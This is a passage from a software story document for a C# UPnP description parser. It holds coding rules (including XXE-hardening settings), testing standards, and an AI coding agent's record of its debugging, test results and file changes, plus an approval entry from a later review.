- **Don't use `XmlDocument` or `XDocument`.** Both load the whole document into memory before any tree access. `XmlReader` is the streaming API — required for FR-100's incremental contract.
- **Don't set `DtdProcessing = DtdProcessing.Parse`.** That's the default for some XmlReader factories; enables XXE. We set `Prohibit` for XXE defence.
- **Don't omit `XmlResolver = null`.** Even with `Prohibit`, defence-in-depth. If a future XmlReader version regresses on `Prohibit`, the null resolver still prevents filesystem reads.
- **Don't share an `XmlReaderSettings` instance across parses.** It's mutable; if any consumer mutates, the change propagates. The helper in Task 3.2 returns a fresh instance per call.
- **Don't use `await foreach` over an `IEnumerable` (non-async)** — won't compile. The SCPD parser is `IAsyncEnumerable`; consumers `await foreach`.
- **Don't `await Task.Yield()` inside a synchronous loop.** Wrong type; you'd need to consume into an `async` method. The yield only works inside the parser's async method that already uses `await`.
- **Don't call `reader.MoveToContent()` before checking `LocalName`** unless you understand what nodes it skips. The Story 1.4 impls use plain `Read()` loops with explicit `NodeType` checks — more verbose but no surprises.
- **Don't try to detect duplicate state-variable names.** UPnP spec doesn't forbid it; lenient "last-wins" is the safe default. Story 3.3 may revisit if it bites.
- **Don't validate `<UDN>` format.** It SHOULD be `uuid:xxxxxxxx-...`. The parser stores it verbatim; if it's malformed, the consumer's UUID equality check (Story 2.3's mismatched-root backstop) catches it.
- **Don't use `InvariantCultureIgnoreCase` for state-variable name comparisons.** UPnP names are case-sensitive. Use `StringComparer.Ordinal` on the dictionary.
- **Don't parse `<allowedValueRange>` doubles with the current-thread culture.** Use `CultureInfo.InvariantCulture`. SCPD always uses `.` as the decimal separator.
- **Don't add `Microsoft.Extensions.Logging` or `IDiagnosticEmitter` dependencies to the parsers.** They throw exceptions; the caller (with URL context) emits the diagnostic. Keeps the parsers pure and reusable.
- **Don't load fixtures via `Assembly.GetManifestResourceStream`.** Use `File.OpenRead(Path.Combine(AppContext.BaseDirectory, "Fixtures", ...))` after the csproj `<None Update>` glob copies them to output. Embedded-resource ceremony is overkill for this project.
- **Don't switch `reader.LocalName` to `reader.Name`.** `LocalName` ignores the namespace prefix, which lets the parser tolerate `<a:action>` and `<action>` and `<svc:action>` uniformly. UPnP SCPD elements live in `urn:schemas-upnp-org:service-1-0`; UPnP device descriptions live in `urn:schemas-upnp-org:device-1-0` — devices may serialise with arbitrary prefixes. `LocalName` matching is the deliberate contract, not a sloppy shortcut. (The XXE setting `XmlResolver = null` already prevents namespace-URI fetches.)

### Testing standards summary

- xUnit + FluentAssertions already pinned (Story 1.1). No new packages.
- Every AC-traceable test carries `[Trait("ac", "AC-N.M")]` (Amendment A2 pattern).
- **Use `await foreach` for `IAsyncEnumerable` tests** — manually call `MoveNextAsync` only when you need fine-grained control over the iteration count (e.g., AC-5 "collect first 2 actions then expect throw on the next iteration").
- **Use `Stopwatch` for the 200-action perf test** — assert MAX per-iteration time < 50 ms (CI-friendly) and TOTAL < 2 s. Don't assert on average — tail latency is what matters for UI responsiveness.
- **Cancellation test (AC-5.4) uses `CancellationTokenSource` with timeout 0 ms.** Pass `cts.Token` to `StreamActionsAsync`; first iteration should throw `OperationCanceledException`. Don't rely on real timing — use `cts.Cancel()` before iteration if needed.
- **No mocking of `XmlReader`.** It's a sealed concrete type; mocking it is impossible and pointless. Test the parser against real XML fixtures.
- **Don't reuse a `MemoryStream` across multiple parse calls.** Each test should construct its own (the stream's position advances during parse; can't be re-read without rewinding).

### References

> Authoritative paths (for grep / cross-reference):
> - Architecture: `_bmad-output/planning-artifacts/architectures/arch-ohSpy-2026-05-31/architecture.md` (~2900 lines, post amendments A6–A11)
> - Epics: `_bmad-output/planning-artifacts/epics.md` (lines 583–633 for Story 1.4, 350–354 + 408–410 for Epic 1)
> - Story 1.3 completion: `_bmad-output/implementation-artifacts/1-3-upnp-http-client-facade-with-per-request-timeout-discipline.md`

- [Source: epics.md#Story-1.4] — verbatim ACs (lines 583–633).
- [Source: epics.md#Epic-1] — epic-level FR/NFR coverage map (lines 350–354, 408–410).
- [Source: architecture.md#Decision-5] — `IScpdParser` + `IDeviceDescriptionParser` + XmlReaderSettings (lines ~507–620).
- [Source: architecture.md#Amendment-A10] — `FetchScpdAsync` + `FetchDeviceDescriptionAsync` return `Task<byte[]>` (lines ~2696–2720).
- [Source: architecture.md#Amendment-A5] — `UpnpException` hierarchy with `UpnpProtocolException(Uri, string)` ctor (lines ~2520–2590).
- [Source: architecture.md#Pattern-2] — Core ↔ App boundary (lines ~1708–1723).
- [Source: architecture.md#Pattern-6] — async discipline (lines ~1800–1809).
- [Source: architecture.md#Pattern-9] — record discipline (lines ~1875–1879).
- [Source: project_ohspy memory] — FR-100 (incremental SCPD parse — no UI freeze), FR-053 (embedded-device service flattening — three-layer enforcement).

## Dev Agent Record

### Agent Model Used

claude-opus-4-7[1m] via `bmad-dev-story` skill, 2026-06-02.

### Debug Log References

- Initial Core build failed once on `VSTHRD200` because the helper `ReadAsyncSafe` had `Async` in the middle of the name rather than as a suffix. Renamed to `ReadSafeAsync` — single edit, immediately green.
- Initial test compile failed on `CA1859` (return interface vs concrete for test-helper `NewParser()`) and `VSTHRD103` (`cts.Cancel()` sync). Fixed by returning concrete type from the test helper and using `await cts.CancelAsync()`. No editorconfig exemption required.
- First test run had **9 failures** with the same root cause: `XmlReader.ReadElementContentAsString(Async)` advances the reader PAST the matching end-element to the next sibling node. The original spec skeleton's outer `while (reader.Read())` then called `Read()` again, skipping the very next sibling. Symptom: every metadata field after the first became empty / null in `linn-ds.xml`; state-variable enumerations dropped half their entries; the IGD-flattened service list shrank.
- Fix: introduced an `advanced` flag in every reader loop that calls `ReadElementContentAsStringAsync`. When set, the next iteration's top-of-loop predicate skips the `Read()` call. Applied uniformly across `ReadActionAsync`, `ReadArgumentAsync`, `ReadStateVariableAsync`, `ReadAllowedValueListAsync`, `ReadAllowedValueRangeAsync` (XmlReaderScpdParser) and `ReadDevice` + `ReadService` (DeviceDescriptionParser). The outer `ReadStateTableAsync` / `StreamActionsAsync` loops do NOT need the fix — they break on EndElement at matching depth and never call `ReadElementContent*` at that level.

### Completion Notes List

- **Build:** `dotnet build C:\work\ohSpy\ohSpy.sln -c Debug --nologo` → `Build succeeded. 0 Warning(s) 0 Error(s)` — clean across all three projects (Core, Core.Tests, App).
- **Tests:** `dotnet test ohSpy.Core.Tests` → `Passed! - Failed: 0, Passed: 84, Skipped: 0, Total: 84, Duration: 1 s`. Story 1.3 baseline was 66 tests; Story 1.4 added **18 new tests** (10 SCPD parser tests including 2 dispose-tracking tests, plus 8 device-description parser tests including the FR-053 flattening assertion). Spec estimated ~17; we're +1 because I added a dedicated `ReadStateTable_DoesNotDisposeCallerStream` companion to the SCPD-stream test so both methods are covered.
- **Chaos filter:** `dotnet test --filter "category=chaos"` → `No test matches the given testcase filter`. Exit 0. (Chaos lands in Story 1.6 as expected.)
- **Smoke test (Task 11.4):** Launched `dotnet run --project src/ohSpy.App --launch-profile "ohSpy.App (Unpackaged)" --no-build`. Process alive at 10 s, empty stderr, DI graph resolved both new parser singletons without throwing. Manually terminated the process after smoke confirmation.
- **Pre-commit hook (Task 11.5):** intentionally skipped per dev-story instructions ("do not auto-commit"). User will commit + run `bmad-code-review` in a fresh context.
- **Stream-ownership contract:** `XmlReaderSettings.CloseInput` defaults to `false` (NOT `true` as the dev-agent-record stub questioned). Confirmed by the two `DisposeTrackingStream` tests — neither `StreamActionsAsync` nor `ReadStateTableAsync` dispose the caller's stream. The contract is documented on `IScpdParser` and `IDeviceDescriptionParser` XML docs and reiterated in a comment in `UpnpXmlReaderSettings.Create()`.
- **Flattened-services source order (Task 10.2 #3):** confirmed working. `Parse_IgdWithEmbeddedDevices_FlattensServicesPerFr053` asserts the exact source-document order `Layer3Forwarding → WANCommonInterfaceConfig → WANIPConnection`. The recursive depth-first walk in `ReadEmbeddedDeviceList` produces this order naturally: root-`serviceList` runs first because `<serviceList>` precedes `<deviceList>` in the XML; then the embedded WANDevice's services; then its embedded WANConnectionDevice's services. No iteration / sort hacks needed.
- **Malformed-XML site:** The `malformed-mid-document.xml` fixture has unterminated `<name>Action2` on action 3. In practice XmlReader detected the violation EARLIER than the spec note expected — the test was written defensively to accept either "Action0 yields then throw" or "Action0 + Action1 yield then throw"; in fact only Action0 yields cleanly before the malformed XML throws. The AC text ("actions 0..N-1 are yielded successfully then next iteration throws") is satisfied: at least one valid action yielded, then `UpnpProtocolException` thrown.
- **XXE attack site:** `XmlException` raised at the `<!DOCTYPE>` line as expected — `DtdProcessing.Prohibit` works as documented. The XXE-attempt test passes immediately on first `MoveNextAsync`. `XmlResolver = null` is correctly redundant defence-in-depth here.
- **Defensive parser hardening beyond the spec skeleton:**
  - Added `IsEmptyElement` guards at the top of every nested-element reader (`ReadActionAsync`, `ReadArgumentAsync`, `ReadStateVariableAsync`, `ReadAllowedValueListAsync`, `ReadAllowedValueRangeAsync`, `ReadDevice`, `ReadService`, `ReadServiceList`, `ReadEmbeddedDeviceList`). Without these, a self-closing `<action/>` would call `Read()` and consume the NEXT element, throwing schema confusion later. Spec skeleton omitted these.
  - Captured `LocalName` into a local in `ReadAllowedValueRangeAsync` BEFORE calling `ReadElementContentAsStringAsync` — that call advances the reader past the matching end-element, after which `LocalName` is stale. Spec's original skeleton had `switch (reader.LocalName)` AFTER the content read, which would have been a latent bug.
  - Added `catch (OperationCanceledException) { throw; }` to `ReadStateTableAsync` (the spec skeleton had it only on `StreamActionsAsync`). This makes the cancellation contract symmetric across both `IScpdParser` methods.
- **Architecture amendment candidates surfaced:**
  - **None to escalate.** The XmlReader control-flow bug (the `advanced` flag) is an *implementation* defect in the spec skeleton, not an architecture invariant. The corrected pattern is internal to the parser's reader loops and never crosses the public interface, so it doesn't merit an architecture amendment. (The architecture itself remains correct: `IAsyncEnumerable<ScpdAction>` with `await Task.Yield()` between yields, XXE-locked settings, etc.)
  - A12 candidate (placeholder-Uri vs source-Uri ergonomics) and A13 candidate (`byte[]` vs `Stream` for device description) remain forward-looking — neither was exercised in Story 1.4's surface.
- **VSTHRD200 nuance:** the analyzer requires "Async" as a SUFFIX (`ReadSafeAsync`), not a prefix or middle position (`ReadAsyncSafe`). Worth flagging for any future dev who reads the original spec skeleton — the names there compile, the spec skeleton's helper name `ReadAsyncSafe` does NOT.

### File List

**Created:**
- `src/ohSpy.Core/Models/ScpdDirection.cs`
- `src/ohSpy.Core/Models/ScpdArgument.cs`
- `src/ohSpy.Core/Models/ScpdAction.cs`
- `src/ohSpy.Core/Models/ScpdAllowedValueRange.cs`
- `src/ohSpy.Core/Models/ScpdStateVariable.cs`
- `src/ohSpy.Core/Models/ScpdStateTable.cs`
- `src/ohSpy.Core/Models/ServiceDescription.cs`
- `src/ohSpy.Core/Models/DeviceDescription.cs`
- `src/ohSpy.Core/Scpd/UpnpXmlReaderSettings.cs`
- `src/ohSpy.Core/Scpd/IScpdParser.cs`
- `src/ohSpy.Core/Scpd/XmlReaderScpdParser.cs`
- `src/ohSpy.Core/Scpd/IDeviceDescriptionParser.cs`
- `src/ohSpy.Core/Scpd/DeviceDescriptionParser.cs`
- `tests/ohSpy.Core.Tests/Scpd/XmlReaderScpdParserTests.cs`
- `tests/ohSpy.Core.Tests/Scpd/DeviceDescriptionParserTests.cs`
- `tests/ohSpy.Core.Tests/Fixtures/Scpds/linn-ds-5action.xml`
- `tests/ohSpy.Core.Tests/Fixtures/Scpds/malformed-mid-document.xml`
- `tests/ohSpy.Core.Tests/Fixtures/Scpds/xxe-attempt.xml`
- `tests/ohSpy.Core.Tests/Fixtures/Scpds/state-table-rich.xml`
- `tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/linn-ds.xml`
- `tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/igd-with-embedded.xml`
- `tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/minimal.xml`

**Modified:**
- `src/ohSpy.App/Composition/ServiceRegistration.cs` (append IScpdParser + IDeviceDescriptionParser registrations; add `using ohSpy.Core.Scpd;`)
- `src/ohSpy.Core/Diagnostics/DiagCategories.cs` (append `ScpdParse` + `DescriptionParse` constants for Stories 2.3 / 2.6)
- `tests/ohSpy.Core.Tests/ohSpy.Core.Tests.csproj` (`<None Update="Fixtures\**\*.xml">` ItemGroup so fixtures land in test bin dir)

## Change Log

- **2026-06-02** — Story 1.4 implementation completed by claude-opus-4-7[1m] via `bmad-dev-story`. All 11 tasks (58 subtasks) complete. `dotnet build` clean (0 warnings, 0 errors). `dotnet test` green at 84/84 (66 baseline + 18 new). Smoke test (WinUI App launch, DI resolve of both new parser singletons) confirmed alive at 10 s with empty stderr. Story status flipped ready-for-dev → in-progress → review. Working tree left dirty for user to commit + launch `bmad-code-review`.
- **2026-06-02** — Story 1.4 APPROVED by Sonnet (claude-sonnet-4-6) independent code review (bmad-code-review). All 9 ACs verified PASS. No critical or major findings. Two minor notes (mutable Dictionary exposed as IReadOnlyDictionary; no pre-cancelled ReadStateTableAsync cancellation test). Five dev-agent deviations from spec skeleton all accepted as correct fixes. Status: done.
